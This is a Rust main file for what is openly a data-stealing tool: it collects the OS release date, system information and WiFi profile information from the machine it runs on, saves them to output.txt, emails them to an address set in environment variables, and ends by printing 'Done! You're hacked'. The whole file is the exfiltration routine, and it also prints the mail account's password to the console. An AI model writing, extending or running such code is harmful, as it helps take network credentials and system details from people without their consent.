use std::env;
use std::fs::File;
use std::io::Write;
use std::time::Instant;

use crate::helpers::{get_os_release_date, get_system_info, get_wifi_profile_info};
use crate::mail_sender::send_email;

mod helpers;
mod mail_sender;

fn main() {
    let start = Instant::now();

    dotenv::dotenv().ok();

    capture_status("Fetching OS Release Date");
    match get_os_release_date() {
        Ok(os_release_date) => append_result(format!("OS Release Date: {}", os_release_date)),
        Err(err) => append_error(format!("Error getting OS release date: {}", err)),
    }

    capture_status("Fetching System Information");
    match get_system_info() {
        Ok(system_info) => append_result(format!("System Information:\n{}", system_info)),
        Err(err) => append_error(format!("Error getting system information: {}", err)),
    }

    capture_status("Fetching WiFi Profile Information");
    let wifi_profile_info = get_wifi_profile_info();
    append_result(wifi_profile_info);

    capture_status("Sending Email");
    if let (Ok(from_mail), Ok(to_mail), Ok(password)) = (
        env::var("FROM_MAIL"),
        env::var("TO_MAIL"),
        env::var("PASSWORD"),
    ) {
        println!("Usrname: {}", &from_mail);
        println!("Passwd: {}", &password);
        send_email(&from_mail, &password, &to_mail, "System Information", &output_message());
    } else {
        eprintln!("Environment variables not properly set for email configuration");
    }

    // Save output message to a text file
    if let Err(err) = save_to_file("output.txt", &output_message()) {
        eprintln!("Error saving to file: {:?}", err);
    }

    let elapsed = start.elapsed();
    println!("Execution Time: {:?}", elapsed);

    println!("Done! You're hacked 😎😉🤔");
}

fn capture_status(message: &str) {
    println!("{}...", message);
}

fn append_result(result: String) {
    OUTPUT_MESSAGE.with(|m| m.borrow_mut().push_str(&result));
}

fn append_error(error_message: String) {
    OUTPUT_MESSAGE.with(|m| m.borrow_mut().push_str(&error_message));
}

fn save_to_file(filename: &str, content: &str) -> std::io::Result<()> {
    let mut file = File::create(filename)?;
    file.write_all(content.as_bytes())?;
    println!("Output saved to {}", filename);
    Ok(())
}

thread_local! {
    static OUTPUT_MESSAGE: std::cell::RefCell<String> = std::cell::RefCell::new(String::new());
}

fn output_message() -> String {
    OUTPUT_MESSAGE.with(|m| m.borrow().clone())
}
